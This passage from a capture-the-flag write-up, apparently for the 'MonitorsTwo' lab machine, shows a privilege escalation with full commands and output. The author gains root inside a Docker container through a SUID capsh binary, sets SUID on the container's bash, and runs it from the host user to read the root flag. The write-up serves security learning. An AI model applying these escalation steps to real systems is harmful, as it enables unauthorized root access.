We can check each these 2 containers in sequence to see which one contains the `test` file:

```bash
marcus@monitorstwo:~$ ls -l /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test
ls: cannot access '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/tmp/test': No such file or directory
marcus@monitorstwo:~$ ls -l /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test
-rw-r--r-- 1 www-data www-data 0 Jan 26 08:00 /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test
```

The container associated with the Capti app is: `c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1`. Now, we need to assign `SUID` permissions to `/bin/bash`, so `marcus` can access it from outside. In order to do that, we need to escalate our privileges within the container. Let's search for `SUID` files:

```bash
www-data@50bca5e748b0:/tmp$ find / -perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```

The `/sbin/capsh` stands out from the above output. Searching [GTFOBins](https://gtfobins.github.io/gtfobins/capsh/#suid) we get this:

![](gtfobins.png){: .normal width="60%"}

Following GFTO's guidance:

```bash
www-data@50bca5e748b0:/tmp$ /sbin/capsh --gid=0 --uid=0 --
root@50bca5e748b0:/tmp# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

And we got root! Now, we give `SUID` permissions to the bash binary:

```bash
# assign suid perms to bash binary
root@50bca5e748b0:/tmp# chmod u+s /bin/bash
# confirm permissions
root@50bca5e748b0:/tmp# ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Finally, we can go back to `marcus` SSH session and execute the bash binary using the [`-p`](https://www.gnu.org/software/bash/manual/html_node/The-Set-Builtin.html#:~:text=If%20the%20%2Dp%20option%20is,real%20user%20and%20group%20ids.&text=Enable%20restricted%20shell%20mode.,once%20it%20has%20been%20set.) flag:

```bash
marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ls -l bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 bash
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ./bash -p
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
bash-5.1# cat /root/root.txt
<SNIP>
```